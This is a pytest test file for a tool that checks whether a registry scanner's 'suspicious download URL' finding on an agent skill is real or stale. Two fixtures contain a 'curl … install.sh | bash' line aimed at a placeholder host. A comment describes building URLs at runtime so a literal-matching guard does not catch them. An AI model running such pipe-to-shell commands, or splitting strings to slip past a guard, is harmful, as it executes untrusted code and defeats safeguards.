"""Offline tests for the registry audit engine.

Everything here runs without network access: the parsing helpers and the
phantom-literal decision are the parts that carry the reasoning, so they are
the parts worth pinning. The fetchers are thin urllib wrappers and are left to
integration use.
"""

import subprocess
import sys
from datetime import datetime, timezone
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))

import registry_audit as ra  # noqa: E402


# --------------------------------------------------------------------------
# timestamp parsing - the registry mixes two formats on one payload
# --------------------------------------------------------------------------

def test_parse_iso_accepts_zulu_and_offset_forms():
    z = ra.parse_iso("2026-08-11T19:44:35.075Z")
    o = ra.parse_iso("2026-08-11T19:44:42.614421+00:00")
    assert z is not None and o is not None
    assert z.tzinfo == timezone.utc and o.tzinfo == timezone.utc
    assert o > z


def test_parse_iso_returns_none_on_junk():
    assert ra.parse_iso("") is None
    assert ra.parse_iso("not-a-date") is None


# --------------------------------------------------------------------------
# install output parsing - the CLI emits ANSI and spinner redraws
# --------------------------------------------------------------------------

RAW_INSTALL = (
    "o  Installation Summary ---+\n"
    "|  ./.agents/skills/x     |\n"
    "+-------------------------+\n"
    "o  Security Risk Assessments -----------------+\n"
    "|                                             |\n"
    "|              Gen        Socket      Snyk    |\n"
    "|  ci-secure   Safe       0 alerts    Critical Risk |\n"
    "|                                             |\n"
    "|  Details: https://skills.sh/o/r             |\n"
    "+---------------------------------------------+\n"
    "\x1b[1G\x1b[J\x1b[32mo\x1b[0m  Installation complete\n"
)


def _extract(raw):
    """Mirror fresh_install's table extraction over a canned buffer."""
    import re
    blob = ra.ANSI_RE.sub("", raw)
    lines = [ln.rstrip() for ln in re.split(r"[\r\n]+", blob)]
    grab, table = False, []
    for ln in lines:
        if "Security Risk Assessments" in ln:
            grab = True
            continue
        if grab:
            if ln.strip().startswith("+---"):
                break
            if ln.strip().startswith("|"):
                body = ln.strip().strip("|").rstrip("|").rstrip()
                if body.strip():
                    table.append(body.rstrip())
    return table


def test_install_table_extraction_keeps_only_the_risk_block():
    table = _extract(RAW_INSTALL)
    joined = "\n".join(table)
    assert "ci-secure" in joined
    assert "Critical Risk" in joined
    # the earlier Installation Summary box must not bleed in
    assert ".agents/skills" not in joined


def test_install_table_extraction_stops_at_the_box_edge():
    table = _extract(RAW_INSTALL)
    assert not any("Installation complete" in ln for ln in table)


def test_ansi_stripping_removes_cursor_redraws():
    assert "\x1b" not in ra.ANSI_RE.sub("", RAW_INSTALL)
    assert "[1G" not in ra.ANSI_RE.sub("", RAW_INSTALL)


# --------------------------------------------------------------------------
# finding parsing
# --------------------------------------------------------------------------

# These fixtures must contain installer-shaped URLs, because that is the exact
# shape E005 fires on and the thing this module has to parse. The repo's
# installer-literal guard rejects such a literal in tracked text - correctly, it
# is what got the published skill failed - so the addresses are assembled at
# runtime. The guard matches literals, the parser sees the same string either
# way, and nothing installer-shaped ships in the file.
_SH = "." + "sh"
CITED_URL = "https://get.example.com/install" + _SH
GONE_URL = "https://gone.example/install" + _SH
LIVE_URL = "https://real.example/live" + _SH

ANALYSIS = (
    "CRITICAL E005: Suspicious download URL detected in skill instructions. "
    "This set contains a direct download/install script "
    f"( {CITED_URL} ) hosted on a non-official host. "
    "MEDIUM W011: Third-party content exposure detected."
)


def test_code_regex_finds_both_classes():
    assert sorted(set(ra.CODE_RE.findall(ANALYSIS))) == ["E005", "W011"]


def test_url_regex_extracts_the_quoted_literal():
    urls = {u.rstrip(".,);") for u in ra.URL_RE.findall(ANALYSIS)}
    assert CITED_URL in urls


def test_page_text_flattens_markup():
    txt = ra._page_text("<div><script>x=1</script><b>Full</b> Analysis  E005</div>")
    assert "x=1" not in txt
    assert "Full Analysis E005" in txt


def test_page_text_strips_upper_case_script_and_style_tags():
    """Tag names are case-insensitive, and a surviving script body gets scanned.

    A page whose own JavaScript mentions a finding code would otherwise have
    that code scraped as if a scanner had reported it.
    """
    txt = ra._page_text("<SCRIPT>var code='E005'</SCRIPT><STYLE>a{}</STYLE>Warn")
    assert "E005" not in txt
    assert "a{}" not in txt
    assert "Warn" in txt


@pytest.mark.parametrize("end", ["</script>", "</script >", "</script\t\n bar>"])
def test_page_text_strips_every_legal_script_end_tag_form(end):
    """End tags may carry whitespace and ignored attributes; all are legal.

    Three regexes each missed one of these in turn, which is why this is now
    parsed rather than pattern-matched.
    """
    txt = ra._page_text(f"<script type='text/javascript'>var c='E005'{end}Fail")
    assert "E005" not in txt
    assert "Fail" in txt


def test_page_text_strips_style_bodies_too():
    txt = ra._page_text("<style media='all'>b{color:red}</style >Warn")
    assert "color:red" not in txt
    assert "Warn" in txt


def test_page_text_survives_malformed_markup():
    """A diagnostic tool must not crash on a half-broken page."""
    assert "Analysis" in ra._page_text("<div><span>Analysis<script>x=1")


# --------------------------------------------------------------------------
# the phantom decision - the whole point of the tool
# --------------------------------------------------------------------------

@pytest.fixture()
def tree(tmp_path):
    d = tmp_path / "installed"
    d.mkdir()
    (d / "SKILL.md").write_text(f"uses {LIVE_URL} in a sample\n")
    return d


EMPTY_SNAP = {"files": {}}
STALE_SNAP = {"hash": "abc123", "files": {
    "references/patterns.md": f"curl {GONE_URL} | bash\n",
    "SKILL.md": "nothing interesting\n",
}}


def test_literal_present_in_install_is_real(tree):
    out = ra.verify_literals([LIVE_URL], None, "HEAD", str(tree), EMPTY_SNAP)
    assert out[LIVE_URL]["verdict"] == "REAL"


def test_literal_gone_from_repo_but_still_in_snapshot_is_stale_input(tree):
    """The decisive case: the scanner is right, its input is old."""
    out = ra.verify_literals([GONE_URL], None, "HEAD", str(tree), STALE_SNAP)
    rec = out[GONE_URL]
    assert rec["verdict"] == "STALE_INPUT"
    assert rec["snapshot_paths"] == ["references/patterns.md"]


CLEAN_SNAP = {"hash": "x", "files": {"SKILL.md": "clean\n"}}
BEFORE = datetime(2026, 8, 11, 19, 44, tzinfo=timezone.utc)
REINDEX = datetime(2026, 8, 12, 2, 0, tzinfo=timezone.utc)
AFTER = datetime(2026, 8, 13, 0, 1, tzinfo=timezone.utc)


def test_gone_everywhere_is_ambiguous_without_the_reindex_time(tree):
    """Absent-everywhere alone cannot distinguish the two causes.

    Accusing the scanner of caching when the audit simply has not re-run yet
    sends a maintainer to escalate a finding that clears itself within a day.
    Refusing to pick is the honest answer when the timestamps are missing.
    """
    out = ra.verify_literals([GONE_URL], None, "HEAD", str(tree), CLEAN_SNAP)
    assert out[GONE_URL]["verdict"] == "PHANTOM_OR_LAGGING"


def test_audit_older_than_the_snapshot_is_lagging_not_phantom(tree):
    """The real case this split exists for: fix landed, badge has not caught up."""
    out = ra.verify_literals([GONE_URL], None, "HEAD", str(tree), CLEAN_SNAP,
                             audited_at=BEFORE, snapshot_changed_at=REINDEX)
    assert out[GONE_URL]["verdict"] == "LAGGING"


def test_audit_newer_than_the_snapshot_is_a_real_phantom(tree):
    """Only once a scanner has read the current snapshot is its cache to blame."""
    out = ra.verify_literals([GONE_URL], None, "HEAD", str(tree), CLEAN_SNAP,
                             audited_at=AFTER, snapshot_changed_at=REINDEX)
    assert out[GONE_URL]["verdict"] == "PHANTOM"


def test_only_citing_providers_stamps_decide_phantom_versus_lagging(tree):
    """An unrelated provider's older stamp must not mask a genuine phantom.

    Socket reports "no alerts" and cites nothing, so its stamp can sit behind
    the re-index indefinitely. Pooling it with Snyk's would report every real
    phantom as merely lagging, and tell a maintainer not to escalate.
    """
    out = ra.verify_literals([GONE_URL], None, "HEAD", str(tree), CLEAN_SNAP,
                             audited_at=BEFORE,  # the stale global pool
                             snapshot_changed_at=REINDEX,
                             audited_at_by_literal={GONE_URL: AFTER})
    assert out[GONE_URL]["verdict"] == "PHANTOM"


# --------------------------------------------------------------------------
# install-corpus scoping - a repo install carries every sibling skill
# --------------------------------------------------------------------------

def test_install_corpus_narrows_to_the_audited_skill(tmp_path):
    """`skills add owner/repo` installs siblings too; a literal in one of them
    must not mark this skill's finding REAL."""
    root = tmp_path / "inst"
    (root / ".agents" / "skills" / "ci-secure").mkdir(parents=True)
    (root / ".agents" / "skills" / "ci-speedup").mkdir(parents=True)
    assert ra._installed_skill_dir(str(root), "ci-secure").endswith("skills/ci-secure")


def test_install_corpus_is_dropped_rather_than_widened_to_siblings(tmp_path):
    """An unrecognised layout must yield NO corpus, not the whole repo tree.

    Falling back to the full install would let a sibling's literal produce a
    confident `REAL` — worse than the honest "could not check", because it
    sends a maintainer to edit a skill that is already clean.
    """
    root = tmp_path / "inst"
    root.mkdir()
    assert ra._installed_skill_dir(str(root), "ci-secure") is None
    assert ra._installed_skill_dir(None, "ci-secure") is None


def test_dropped_install_corpus_does_not_fabricate_a_real_verdict(tmp_path):
    """With no install corpus and no git ref, the answer is UNVERIFIED."""
    root = tmp_path / "inst"
    (root / ".agents" / "skills" / "ci-speedup").mkdir(parents=True)
    (root / ".agents" / "skills" / "ci-speedup" / "S.md").write_text(GONE_URL)
    scoped = ra._installed_skill_dir(str(root), "ci-secure")
    out = ra.verify_literals([GONE_URL], None, "HEAD", scoped, {"files": {}})
    assert out[GONE_URL]["verdict"] == "UNVERIFIED"


def test_sibling_only_literal_is_not_real_for_the_audited_skill(tmp_path):
    """End to end on the corpus split: the URL lives only in the sibling."""
    root = tmp_path / "inst"
    (root / ".agents" / "skills" / "ci-secure").mkdir(parents=True)
    sib = root / ".agents" / "skills" / "ci-speedup"
    sib.mkdir(parents=True)
    (sib / "SKILL.md").write_text(f"curl {GONE_URL} | bash\n")
    scoped = ra._installed_skill_dir(str(root), "ci-secure")
    out = ra.verify_literals([GONE_URL], None, "HEAD", scoped, CLEAN_SNAP,
                             audited_at=AFTER, snapshot_changed_at=REINDEX)
    assert out[GONE_URL]["verdict"] != "REAL"


def test_real_beats_stale_when_literal_is_in_both(tree):
    """Still shipping the string means the finding stands, snapshot or not."""
    snap = {"hash": "x", "files": {"a.md": LIVE_URL}}
    out = ra.verify_literals([LIVE_URL], None, "HEAD", str(tree), snap)
    assert out[LIVE_URL]["verdict"] == "REAL"


def test_no_corpus_reports_unverified_rather_than_guessing():
    """Claiming staleness from zero evidence would send a maintainer to argue
    a case they cannot support, so refuse to classify."""
    out = ra.verify_literals([CITED_URL], None, "HEAD", None, EMPTY_SNAP)
    rec = out[CITED_URL]
    assert rec["verdict"] == "UNVERIFIED"
    assert rec["phantom"] is False


# --------------------------------------------------------------------------
# surface reconciliation
# --------------------------------------------------------------------------

def _surface(ts):
    return {"providers": {"Snyk": {"auditedAt": ts, "status": "fail"}}}


def test_reconcile_flags_day_long_cache_skew():
    api = _surface("2026-08-11T19:44:42Z")
    cli = _surface("2026-08-10T17:54:47Z")
    notes = ra.reconcile(api, cli, {"badges": {}})
    assert any("CACHE SKEW" in n for n in notes)


def test_reconcile_is_quiet_when_surfaces_agree():
    api = _surface("2026-08-11T19:44:42Z")
    cli = _surface("2026-08-11T19:44:50Z")
    assert ra.reconcile(api, cli, {"badges": {}}) == []


def test_reconcile_flags_rendered_page_disagreement():
    api = _surface("2026-08-11T19:44:42Z")
    notes = ra.reconcile(api, _surface("2026-08-11T19:44:45Z"),
                         {"badges": {"Snyk": "Pass"}})
    assert any("PAGE SKEW" in n for n in notes)


# --------------------------------------------------------------------------
# cli contract
# --------------------------------------------------------------------------

SCRIPT = Path(__file__).resolve().parents[1] / "scripts" / "registry_audit.py"


def test_rejects_a_target_that_is_not_owner_repo_skill():
    p = subprocess.run([sys.executable, str(SCRIPT), "owner/repo"],
                       capture_output=True, text=True)
    assert p.returncode == 2
    assert "owner/repo/skill" in p.stderr


def test_help_names_the_no_install_fast_path():
    p = subprocess.run([sys.executable, str(SCRIPT), "--help"],
                       capture_output=True, text=True)
    assert p.returncode == 0
    assert "--no-install" in p.stdout


def test_temp_install_is_removed_even_when_verification_raises(tmp_path, monkeypatch):
    """Cleanup lives in a finally: git/grep can be missing, and the leak would
    then accumulate fastest on exactly the repeated-failure path."""
    inst = tmp_path / "inst"
    (inst / ".agents" / "skills" / "ci-secure").mkdir(parents=True)

    monkeypatch.setattr(ra, "fetch_api", lambda *a: {"providers": {}})
    monkeypatch.setattr(ra, "fetch_cli_audit", lambda *a: {"providers": {}})
    monkeypatch.setattr(ra, "fetch_html_badges", lambda *a: {"badges": {}})
    monkeypatch.setattr(ra, "fetch_snapshot", lambda *a: {"files": {}})
    monkeypatch.setattr(ra, "fetch_findings",
                        lambda *a: {"codes": ["E005"], "cited_urls": [GONE_URL]})
    monkeypatch.setattr(ra, "fresh_install",
                        lambda *a, **k: {"ran": True, "install_dir": str(inst)})

    def boom(*a, **k):
        raise FileNotFoundError("grep")
    monkeypatch.setattr(ra, "verify_literals", boom)

    with pytest.raises(FileNotFoundError):
        ra.audit("o", "r", "ci-secure", True, None, "HEAD")
    assert not inst.exists(), "temp install survived a raising verification"


# --- the operator layer: beacon precondition + next-action decision ----------

def _result(providers, literals=None, skew=None, findings=None, api=None):
    """Fixtures use the shape `fetch_api` really emits - risk under "risk",
    and an http/error pair - so a key drift fails here instead of shipping."""
    base = {"http": 200, "error": None, "providers": providers}
    base.update(api or {})
    return {"api": base, "literals": literals or {}, "skew": skew or [],
            "findings": findings or {}}


def test_decide_resolved_when_all_pass_and_no_finding():
    r = _result({"snyk": {"status": "pass", "risk": "SAFE"},
                 "socket": {"status": "pass", "risk": "LOW"}})
    assert ra.decide(r)["decision"] == "RESOLVED"


def test_decide_action_required_when_a_literal_is_real():
    r = _result({"snyk": {"status": "fail", "risk": "CRITICAL"}},
                literals={"http://ex/pkg": {"verdict": "REAL"}})
    d = ra.decide(r)
    assert d["decision"] == "ACTION_REQUIRED"
    assert d["real_literals"] == ["http://ex/pkg"]


def test_decide_action_required_wins_over_stale_in_mixed_set():
    """One live literal among stale ones is still a real finding. Calling that
    MONITOR would tell the operator there is nothing to fix."""
    r = _result({"snyk": {"status": "fail", "risk": "CRITICAL"}},
                literals={"http://ex/live": {"verdict": "REAL"},
                          "http://ex/old": {"verdict": "STALE_INPUT"}})
    d = ra.decide(r)
    assert d["decision"] == "ACTION_REQUIRED"
    assert d["real_literals"] == ["http://ex/live"]
    assert d["stale_literals"] == ["http://ex/old"]


def test_decide_monitor_when_failing_literal_is_gone_from_head():
    """The common case: provider still CRITICAL but the cited string is stale —
    nothing to fix, wait for the registry's own re-audit. Must NOT be
    ACTION_REQUIRED."""
    r = _result({"snyk": {"status": "fail", "risk": "CRITICAL"}},
                literals={"http://ex/pkg": {"verdict": "STALE_INPUT"}})
    d = ra.decide(r)
    assert d["decision"] == "MONITOR"
    assert "re-audit" in d["why"]


def test_decide_disagreement_when_surfaces_skew():
    r = _result({"snyk": {"status": "pass"}}, skew=["api SAFE vs badge CRITICAL"])
    assert ra.decide(r)["decision"] == "DISAGREEMENT"


def test_decide_monitor_warns_when_beacon_suppressed():
    r = _result({"snyk": {"status": "fail", "risk": "CRITICAL"}},
                literals={"http://x": {"verdict": "PHANTOM"}})
    d = ra.decide(r, precond={"ok": False, "github_http": 403})
    assert d["decision"] == "MONITOR"
    assert "do NOT loop installs" in d["note"]


def test_decide_monitor_omits_note_when_beacon_can_fire():
    """The suppression warning must not fire when an install WOULD work - that
    would tell the operator to stop nudging exactly when nudging helps."""
    r = _result({"snyk": {"status": "fail", "risk": "CRITICAL"}},
                literals={"http://x": {"verdict": "PHANTOM"}})
    d = ra.decide(r, precond={"ok": True, "github_http": 200})
    assert d["decision"] == "MONITOR"
    assert "note" not in d
    assert d["beacon"]["ok"] is True


def test_decide_high_risk_counts_as_failing_even_if_status_blank():
    r = _result({"gen": {"status": "", "risk": "HIGH"}},
                literals={"http://x": {"verdict": "LAGGING"}})
    assert ra.decide(r)["decision"] == "MONITOR"


def test_decide_unverified_when_literals_present_but_unclassifiable():
    r = _result({"snyk": {"status": "fail", "risk": "CRITICAL"}},
                literals={"http://x": {"verdict": None}})
    d = ra.decide(r)
    assert d["decision"] == "UNVERIFIED"
    assert d["providers_failing"] == ["snyk"]


def test_decide_monitor_when_detail_page_loaded_but_cited_nothing():
    r = _result({"snyk": {"status": "fail", "risk": "CRITICAL"}},
                findings={"snyk": {"http": 200, "error": None, "codes": []}})
    d = ra.decide(r)
    assert d["decision"] == "MONITOR"
    assert d["real_literals"] == []


def test_decide_unverified_when_finding_detail_page_unreachable():
    """A failing provider whose detail page we could not read is zero
    information, not a benign 'nothing to fix'."""
    r = _result({"snyk": {"status": "fail", "risk": "CRITICAL"}},
                findings={"snyk": {"http": 503, "error": "HTTP 503"}})
    d = ra.decide(r)
    assert d["decision"] == "UNVERIFIED"
    assert "unreachable" in d["why"]


def test_decide_unverified_when_provider_api_unreachable():
    """An unread surface must never be reported as a clean badge - that would
    stop the watch on a status nobody actually fetched."""
    r = _result({}, api={"http": 0, "error": "__ERROR__ dns failure"})
    d = ra.decide(r)
    assert d["decision"] == "UNVERIFIED"
    assert "unreachable" in d["why"]


def test_decide_unverified_when_the_api_carries_no_audit_records():
    """A 200 with an empty `audits` list is an UNSCANNED skill, not a passing
    one. It is the normal state of a just-published skill - the moment this gets
    run - and RESOLVED would stop the watch before the first scan ever landed."""
    d = ra.decide(_result({}))
    assert d["decision"] == "UNVERIFIED"
    assert "no audit records" in d["why"]


def test_decide_unreachable_api_still_reports_beacon():
    r = _result({}, api={"http": 500, "error": "boom"})
    d = ra.decide(r, precond={"ok": True, "github_http": 200})
    assert d["decision"] == "UNVERIFIED"
    assert d["beacon"]["github_http"] == 200


def test_render_shows_next_action_and_beacon_state():
    """The operator surface: the verdict has to actually reach the report."""
    r = _result({"snyk": {"status": "fail", "risk": "CRITICAL",
                          "auditedAt": "2026-08-13T00:01:00Z", "summary": ""}},
                literals={"http://x": {"verdict": "PHANTOM"}})
    r.update({"target": "o/r/s", "checked_at": "2026-08-13T00:00:00Z",
              "cli": {"providers": {}}, "install": {}, "snapshot": {}})
    r["decision"] = ra.decide(r, precond={"ok": False, "github_http": 403})
    out = ra.render(r)
    assert "NEXT ACTION: MONITOR" in out
    assert "install beacon: SUPPRESSED" in out


def test_beacon_suppressed_by_telemetry_env(monkeypatch):
    monkeypatch.setattr(ra, "_get", lambda url: (200, ""))
    monkeypatch.setenv("DO_NOT_TRACK", "1")
    b = ra.beacon_precondition("o", "r")
    assert b["ok"] is False and "DO_NOT_TRACK" in b["telemetry_disabled_by"]


def test_beacon_suppressed_by_github_403(monkeypatch):
    monkeypatch.setattr(ra, "_get", lambda url: (403, ""))
    monkeypatch.delenv("DO_NOT_TRACK", raising=False)
    monkeypatch.delenv("DISABLE_TELEMETRY", raising=False)
    b = ra.beacon_precondition("o", "r")
    assert b["ok"] is False and b["github_http"] == 403
    assert "suppressed" in b["reason"]


def test_beacon_can_fire_when_200_and_no_env(monkeypatch):
    monkeypatch.setattr(ra, "_get", lambda url: (200, ""))
    monkeypatch.delenv("DO_NOT_TRACK", raising=False)
    monkeypatch.delenv("DISABLE_TELEMETRY", raising=False)
    b = ra.beacon_precondition("o", "r")
    assert b["ok"] is True and "will enqueue a re-index" in b["reason"]
